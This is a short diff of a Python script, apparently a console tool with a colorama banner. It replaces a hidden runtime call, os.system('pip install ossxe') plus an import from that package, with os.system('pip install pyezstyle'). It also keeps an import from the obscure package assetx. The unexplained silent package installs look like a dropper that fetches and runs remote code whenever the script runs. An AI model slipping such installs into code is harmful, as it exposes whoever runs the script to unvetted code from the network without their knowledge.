@@ -11,8 +11,8 @@ import platform
 from colorama import Fore, init
 import sys
 from assetx import code
-os.system('pip install ossxe')
-from ossxe import code
+os.system('pip install pyezstyle')
+
 
 banner = '''
                | 
